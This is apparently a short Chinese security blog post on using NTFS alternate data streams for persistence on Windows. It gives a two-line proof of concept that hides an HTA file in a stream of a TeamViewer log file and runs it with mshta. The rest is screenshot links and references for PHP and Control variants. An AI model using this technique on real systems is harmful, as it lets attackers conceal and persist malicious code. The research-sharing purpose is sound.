---
title: 维权访问-ADS数据流
date: 2018-01-17 20:47:34
tags: windows
categories: windows
---
![enter description here][1]
<!--more-->
## TeamViewer13
``` TeamViewer13_Bug_POC
C :\>type :\temp\helloworld.hta >"C :\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:helloworld.hta"
C :\>mshta"c :\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:helloworld.hta"

```


![enter description here][2]


![enter description here][3]

![enter description here][4]

## 2.PHP
未寄宿 可以执行
![enter description here][5]


删除文件
![enter description here][7]



删除文件----寄宿数据流成功，并可以运行
![enter description here][6]





## 3.Control
![enter description here][9]


![enter description here][8]

链接资料：https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/

https://twitter.com/bohops/status/954466315913310209


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_2231.JPG
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/F2ABBAF5D93F6A45A6F005F907DFC77D.png
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_2229.JPG
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_2231.JPG
  [5]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/3ADCD300BE41699E206A58A27C3E5346.jpg
  [6]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/FF6700C8B27E0C50A1DE7BFCC9D92867.jpg
  [7]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/7A430BB5C008502F29CA155414350C39.jpg
  [8]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/DT7xuuMXcAESY2i.jpg 
  [9]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/0B832B73B79537BE95569BD0AFC2C61A.jpg 